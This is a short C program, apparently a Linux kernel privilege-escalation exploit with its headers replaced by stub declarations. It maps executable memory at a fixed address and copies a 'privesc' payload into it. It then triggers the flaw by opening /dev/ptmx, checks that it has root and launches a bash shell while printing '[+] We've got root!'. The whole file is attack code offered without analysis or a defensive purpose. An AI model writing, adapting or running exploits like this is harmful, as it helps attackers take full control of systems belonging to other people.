
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 scalar_t__ MMAP_ADDR ;
 scalar_t__ MMAP_OFFSET ;
 int O_RDWR ;
 int assert (int) ;
 int close (int) ;
 int execl (char*,char*,int *) ;
 int getuid () ;
 void* memcpy (void*,int *,int) ;
 int memset (void*,int ,int) ;
 scalar_t__ mmap (void*,int,int,int,int ,int ) ;
 int open (char*,int ) ;
 int printf (char*) ;
 int privesc ;

int main() {
 void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);
 assert(payload == (void *)MMAP_ADDR);

 void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);

 memset(shellcode, 0, 0x300000);

 void *ret = memcpy(shellcode, &privesc, 0x300);
 assert(ret == shellcode);

 printf("[+] Escalating privs...\n");

 int fd = open("/dev/ptmx", O_RDWR);
 close(fd);

 assert(!getuid());

 printf("[+] We've got root!");

        return execl("/bin/bash", "-sh", ((void*)0));
}
